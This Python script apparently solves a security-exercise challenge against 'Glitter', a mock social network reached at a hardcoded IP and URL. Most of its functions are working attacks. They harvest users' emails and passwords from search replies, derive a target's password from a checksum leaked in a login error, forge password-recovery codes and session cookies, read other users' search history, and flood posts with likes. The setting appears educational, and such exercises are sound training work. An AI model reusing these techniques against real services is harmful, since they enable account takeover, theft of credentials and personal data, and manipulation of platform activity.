import socket
import random
import string
from datetime import datetime
import requests
import hashlib

SERVER_HOST = "54.187.16.171"
SERVER_PORT = 1336
CURRENT_USER = {}
MAIN_URL = "http://cyber.glitter.org.il"

def establish_connection():
    """
    Establishes and returns a socket connection to the server.

    :returns: A socket object connected to the server.
    :rtype: socket.socket
    """
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((SERVER_HOST, SERVER_PORT))
    return connection

def test_username(lentgh):
    """
    Tests if the server accepts a username of a specific length by attempting to register a user.

    :param lentgh: The length of the random username to test.
    :type lentgh: int
    :returns: True if the server response indicates approval, False otherwise.
    :rtype: bool
    """
    conn = establish_connection()
    oversized_name = ""
    for i in range(lentgh):
        oversized_name += random.choice(string.ascii_uppercase)
    registration_data = f"150#{{gli&&er}}{{\"registration_code\":\"12345\",\"user\":{{\"screen_name\":\"DanielHamagniv\",\"avatar\":\"im1\",\"description\":\"magniv\",\"privacy\":\"Public\",\"id\":-1,\"user_name\":\"{oversized_name}\",\"password\":\"180509\",\"gender\":\"Male\",\"mail\":\"daniel@gaaon.fun\"}}}}##"
    conn.sendall(registration_data.encode())
    server_response = conn.recv(1024).decode()
    conn.close()
    return "approved" in server_response

def compute_checksum(input_string):
    """
    Computes a simple checksum by summing the ordinal values of the characters in a string.

    :param input_string: The string to process.
    :type input_string: str
    :returns: The calculated checksum.
    :rtype: int
    """
    total = 0
    for char in input_string:
        total += ord(char)
    return total

def extract_data(server_response):
    """
    Parses a raw server response string to extract user data into a dictionary.

    :param server_response: The raw string from the server.
    :type server_response: str
    :returns: A dictionary containing the extracted user fields.
    :rtype: dict
    """
    extracted_data = {}
    
    if '"screen_name":"' in server_response:
        start_idx = server_response.find('"screen_name":"') + len('"screen_name":"')
        end_idx = server_response.find('"', start_idx)
        extracted_data['screen_name'] = server_response[start_idx:end_idx]

    if '"id":' in server_response:
        start_idx = server_response.find('"id":') + len('"id":')
        end_idx = server_response.find(',', start_idx)
        if end_idx == -1:
            end_idx = server_response.find('}', start_idx)
        extracted_data['id'] = int(server_response[start_idx:end_idx].strip())
    
    if '"privacy":"' in server_response:
        start_idx = server_response.find('"privacy":"') + len('"privacy":"')
        end_idx = server_response.find('"', start_idx)
        extracted_data['privacy'] = server_response[start_idx:end_idx]

    if '"user_name":"' in server_response:
        start_idx = server_response.find('"user_name":"') + len('"user_name":"')
        end_idx = server_response.find('"', start_idx)
        extracted_data['user_name'] = server_response[start_idx:end_idx]
        
    if '"password":"' in server_response:
        start_idx = server_response.find('"password":"') + len('"password":"')
        end_idx = server_response.find('"', start_idx)
        extracted_data['password'] = server_response[start_idx:end_idx]

    if '"mail":"' in server_response:
        start_idx = server_response.find('"mail":"') + len('"mail":"')
        end_idx = server_response.find('"', start_idx)
        extracted_data['mail'] = server_response[start_idx:end_idx]
    
    return extracted_data

def authenticate_user(username, pwd, connection):
    """
    Authenticates a user against the server using a two-step process.

    :param username: The username for authentication.
    :type username: str
    :param pwd: The password for authentication.
    :type pwd: str
    :param connection: An active socket connection to the server.
    :type connection: socket.socket
    :returns: A dictionary with user details upon successful authentication, otherwise None.
    :rtype: dict or None
    """
    global CURRENT_USER
    try:
        auth_packet = ('100#{gli&&er}{"user_name":"' + username + '", "password":"' + pwd + '", "enable_push_notifications":true}##').encode()
        connection.sendall(auth_packet)
        connection.recv(1024)
        verification_sum = compute_checksum(f"{username}{pwd}")
        verification_packet = (f'110#{{gli&&er}}{verification_sum}##').encode()
        connection.sendall(verification_packet)
        auth_response = connection.recv(1024).decode()
        if "approved" in auth_response:
            auth_response = auth_response.replace("115#Authentication approved{gli&&er}", "").replace("##", "")
            user_details = extract_data(auth_response)
            CURRENT_USER = user_details
            return user_details
    except Exception as error:
        print(f"Authentication error: {error}")
    return None

def harvest_email_address(connection, target_name):
    """
    Searches for a user by their screen name and retrieves their email address.

    :param connection: An active socket connection to the server.
    :type connection: socket.socket
    :param target_name: The screen name of the user to search for.
    :type target_name: str
    :returns: A formatted string with the user's screen name and email, or a status message if not found.
    :rtype: str
    """
    try:
        search_request = (f'300#{{gli&&er}}{{"search_type":"SIMPLE", "search_entry":"{target_name}"}}##').encode()
        connection.sendall(search_request)
    except Exception as error:
        return f"Error during email retrieval -> {error}"
    
    server_reply = connection.recv(1024).decode()
    
    data = extract_data(server_reply)
    
    if data:
        return f"Username: {data['screen_name']}, Email: {data['mail']}"
    else:
        return "User not found"

def weak_pin_or_pass(option):
    """
    Tests the server's validation by attempting to register with a weak password or registration code.

    :param option: Determines the test case. 12 for a short password, otherwise a short registration code.
    :type option: int
    :returns: True if the registration is approved, False otherwise.
    :rtype: bool
    """
    regi_code = 12345
    password = 123456
    conn = establish_connection()
    random_name = ""

    for i in range(15):
        random_name += random.choice(string.ascii_uppercase)
    
    if option == 12:
        password = 18
    else:
        regi_code = 18
    registration_packet = f"150#{{gli&&er}}{{\"registration_code\":\"{regi_code}\",\"user\":{{\"screen_name\":\"{random_name}\",\"avatar\":\"im1\",\"description\":\"magniv\",\"privacy\":\"Public\",\"id\":-1,\"user_name\":\"{random_name}\",\"password\":\"{password}\",\"gender\":\"Male\",\"mail\":\"daniel@gaaon.fun\"}}}}##"
    conn.sendall(registration_packet.encode())
    reply = conn.recv(1024).decode()
    conn.close()
    return "approved" in reply

def create_post(connection, user_id, option):
    """
    Creates a post with specific properties determined by the option parameter.

    :param connection: An active socket connection to the server.
    :type connection: socket.socket
    :param user_id: The id of the user creating the post.
    :type user_id: int
    :param option: A number that determines the post's attributes.
    :type option: int
    :returns: True if the server response indicates the post was approved, False otherwise.
    :rtype: bool
    """
    color = "White"
    date = str(datetime.utcnow()).replace(" ", "T")
    date = date[0:23] + "Z"
    if option == 5:
        date = "0000-00-00T00:00:00.00Z"
        text = "not time"
    elif option == 6:
        date = "2009-05-18T01:18:05.09Z"
        text = "from the past"
    elif option == 7:
        date = "2999-05-18T01:18:05.09Z"
        text = "from the Future"
    elif option == 8:
        color = "blue"
        text = "special color"

    post_data = f"550#{{gli&&er}}{{\"feed_owner_id\":{user_id}, \"publisher_id\":{user_id}, \"publisher_screen_name\":\"Daniel\", \"publisher_avatar\":\"im1\",\"background_color\":\"{color}\",\"date\":\"{date}\",\"content\":\"{text}\",\"font_color\":\"black\",\"id\":-1}}##"
    connection.sendall(post_data.encode())
    response = connection.recv(1024).decode()
    return "approved" in response

def glits_id(connection, user_id):
    """
    Fetches the IDs of the latest 35 'glits' (posts) from a users feed.

    :param connection: An active socket connection to the server.
    :type connection: socket.socket
    :param user_id: The id of the user whose feed is being requested.
    :type user_id: int
    :returns: A list of glit ids, or None if no glits are found or an error occurs.
    :rtype: list or None
    """
    current_time = str(datetime.utcnow()).replace(" ", "T")
    current_time = current_time[0:23] + "Z"
    
    post_packet = f"500#{{gli&&er}}{{\"feed_owner_id\":{user_id},\"end_date\":\"{current_time}\",\"glit_count\":35}}##"
    connection.sendall(post_packet.encode())
    post_reply = str(connection.recv(100000).decode())

    glits_marker = '[{'
    
    if glits_marker not in post_reply:
        return None
    
    glits_position = post_reply.find(glits_marker)
    
    glits_position += len(glits_marker)
    glits_end_position = post_reply.find('],"commentsMap"', glits_position)
    
    if glits_end_position == -1:
        return None
    
    glits = post_reply[glits_position:glits_end_position]
    glits_list = glits.split(',{')
    id_list = []

    for glit in glits_list:
        data = extract_data(glit)
        id_list.append(data['id'])

    return id_list

def execute_like(connection, display_name, user_id, option, num_of_likes):
    """
    Adds a specified number of likes to a users post.

    :param connection: An active socket connection to the server.
    :type connection: socket.socket
    :param display_name: The screen name of the user performing the like.
    :type display_name: str
    :param user_id: The id of the user whose post is to be liked.
    :type user_id: int
    :param option: A special flag; if 11, an empty display name is used.
    :type option: int
    :param num_of_likes: The number of times to send the like packet.
    :type num_of_likes: int
    :returns: 0 on success, 1 on failure.
    :rtype: int
    """
    glits = glits_id(connection, user_id)
    if glits == None:
        return 1
    print("available glits:")
    for id in glits:
        print(id)
    post_identifier = int(input("enter the glit to add likes to: "))
    while post_identifier not in glits:
        post_identifier = int(input("no glit with this number, try enter another one: "))

    if option == 11:
        display_name = ""

    like_packet = f"710#{{gli&&er}}{{\"glit_id\":{post_identifier},\"user_id\":{user_id},\"user_screen_name\":\"{display_name}\",\"id\":-1}}##"
    if post_identifier != -1:     
        for i in range(num_of_likes):
            connection.sendall(like_packet.encode())
            connection.recv(1024)
        return 0
    else:
        return 1

def find_privet(connection, target_name):
    """
    Checks the privacy status (Public or Private) of a user's account.

    :param connection: An active socket connection to the server.
    :type connection: socket.socket
    :param target_name: The screen name of the user to check.
    :type target_name: str
    :returns: A string indicating the privacy status or if the user was not found.
    :rtype: str
    """
    try:
        search_request = (f'300#{{gli&&er}}{{"search_type":"SIMPLE", "search_entry":"{target_name}"}}##').encode()
        connection.sendall(search_request)
    except Exception as error:
        return f"Error during finding privet -> {error}"
    
    server_reply = connection.recv(1024).decode()
    packet_data = extract_data(server_reply)

    if "\"privacy\":\"Public\"" in server_reply:
        return "this account is PUBLIC"
    
    elif "\"privacy\":\"Private\"" in server_reply:
        return "this user is Private"
    
    else:
        return "User not found"
    
def find_every_info(connection, target_name):
    """
    Retrieves all available information for a user by their screen name.

    :param connection: An active socket connection to the server.
    :type connection: socket.socket
    :param target_name: The screen name of the user to search for.
    :type target_name: str
    :returns: A dictionary with all found user data, or a string "User not found".
    :rtype: dict or None
    """
    try:
        search_request = (f'300#{{gli&&er}}{{"search_type":"SIMPLE", "search_entry":"{target_name}"}}##').encode()
        connection.sendall(search_request)
    except Exception as error:
        return f"Error during finding all info -> {error}"
    
    server_reply = connection.recv(1024).decode()
    packet_data = extract_data(server_reply)
    if packet_data:
        return packet_data
    else:
        return None

def get_checksum(target_name):
    """
    Initiates a login attempt with a random password to retrieve a checksum from the server's error response.

    :param target_name: The username to use in the login attempt.
    :type target_name: str
    :returns: The checksum as an integer if found, otherwise None.
    :rtype: int or None
    """
    conn = establish_connection()
    password = ""
    for i in range(10):
        password += random.choice(string.ascii_uppercase)
    registration_data = f"100#{{gli&&er}}{{\"user_name\":\"{target_name}\", \"password\":\"{password}\", \"enable_push_notifications\":true}}####"
    conn.sendall(registration_data.encode())
    server_response = conn.recv(1024).decode()
    conn.close()
    if 'checksum: ' in server_response:
        start_idx = server_response.find('checksum: ') + len('checksum: ')
        end_idx = server_response.find('{', start_idx)
        return int(server_response[start_idx:end_idx])
    else:
        return None
    
def same_name(screen_name):
    """
    Attempts to register two different users with the exact same screen name.

    :param screen_name: The screen name to be used for both registration attempts.
    :type screen_name: str
    :returns: True if both registration attempts are approved by the server, False otherwise.
    :rtype: bool
    """
    regi_code = 12345
    password = 123456
    conn1 = establish_connection()
    conn2 = establish_connection()
    random_user1 = ""
    random_user2 = ""

    for i in range(15):
        random_user1 += random.choice(string.ascii_uppercase)
    for i in range(15):
        random_user2 += random.choice(string.ascii_uppercase)

    first_packet = f"150#{{gli&&er}}{{\"registration_code\":\"{regi_code}\",\"user\":{{\"screen_name\":\"{screen_name}\",\"avatar\":\"im1\",\"description\":\"magniv\",\"privacy\":\"Public\",\"id\":-1,\"user_name\":\"{random_user1}\",\"password\":\"{password}\",\"gender\":\"Male\",\"mail\":\"daniel@gaaon.fun\"}}}}##"
    conn1.sendall(first_packet.encode())
    first_reply = conn1.recv(1024).decode()

    second_packet = f"150#{{gli&&er}}{{\"registration_code\":\"{regi_code}\",\"user\":{{\"screen_name\":\"{screen_name}\",\"avatar\":\"im1\",\"description\":\"magniv\",\"privacy\":\"Public\",\"id\":-1,\"user_name\":\"{random_user2}\",\"password\":\"{password}\",\"gender\":\"Male\",\"mail\":\"daniel@gaaon.fun\"}}}}##"
    conn2.sendall(second_packet.encode())
    second_reply = conn2.recv(1024).decode()

    conn1.close()
    conn2.close()
    return "approved" in first_reply and "approved" in second_reply

def login_challenge(target_name):
    """
    Performs a login challenge by first getting a checksum and then using it to derive the correct password.

    :param target_name: The username of the account to log into.
    :type target_name: str
    :returns: True if the login is successful (approved), False otherwise.
    :rtype: bool
    """
    checksum = get_checksum(target_name)
    symbol = chr(checksum - compute_checksum(target_name))

    conn = establish_connection()

    registration_data = f"100#{{gli&&er}}{{\"user_name\":\"{target_name}\", \"password\":\"{symbol}\", \"enable_push_notifications\":true}}####"
    conn.sendall(registration_data.encode())
    server_response = conn.recv(1024).decode()

    second_packet = f"110#{{gli&&er}}{checksum}##"
    conn.sendall(second_packet.encode())
    server_response = conn.recv(1024).decode()
    conn.close()
    
    return "approved" in server_response

def privacy_challenge(connection, user_id):
    """
    showes the search history (a list of screen names) for a given user id.

    :param connection: An active socket connection to the server.
    :type connection: socket.socket
    :param user_id: The id of the user whose history is being requested.
    :type user_id: int
    :returns: A list of screen names from the user's search history.
    :rtype: list
    """
    history = []
    registration_data = f"320#{{gli&&er}}{user_id}##"
    connection.sendall(registration_data.encode())
    server_response = connection.recv(1024).decode()
    response_splited = server_response.split(',{')
    for piece in response_splited:
        data = extract_data(piece)
        history.append(data['screen_name'])
    
    return history

def password_challenge(user_name, user_id):
    """
    Attempts a password recovery by making HTTP POST requests to thhe web server.

    :param user_name: The username for which to attempt password recovery.
    :type user_name: str
    :param user_id: The users id, used to generate part of the verification code.
    :type user_id: int
    :returns: The text content of the final HTTP response from the server.
    :rtype: str
    """
    middle_code = ""
    try:
        requests.post(f"{MAIN_URL}/password-recovery-code-request", json=user_name) # HERE I LEAREND ABOUT THE POST: https://www.w3schools.com/PYTHON/ref_requests_post.asp
        ver_code = datetime.now().strftime("%d%m_rep_%H%M") # HERE I LEARED ABOUT STRFTIME: https://www.geeksforgeeks.org/python/python-strftime-function/
        for integer in str(user_id):
            num = int(integer) + ord('A')
            middle_code += chr(num)

        ver_code = ver_code.replace("_rep_", middle_code)
        ans = requests.post(f"{MAIN_URL}/password-recovery-code-verification", json=[user_name, ver_code])   
        return ans.text
    except Exception as e:
        print("There was an error: ", e)

def cookie_challenge(user_name):
    """
    Generates a formatted cookie string based on the user name and the current date and time.

    :param user_name: The users name to be included in the cookie hash.
    :type user_name: str
    :returns: A formatted cookie string.
    :rtype: str
    """
    date = datetime.now().strftime("%d%m%Y")
    time = datetime.now().strftime("%H%M")
    return f"{date}.{hashlib.md5(user_name.encode()).hexdigest()}.{time}.{date}"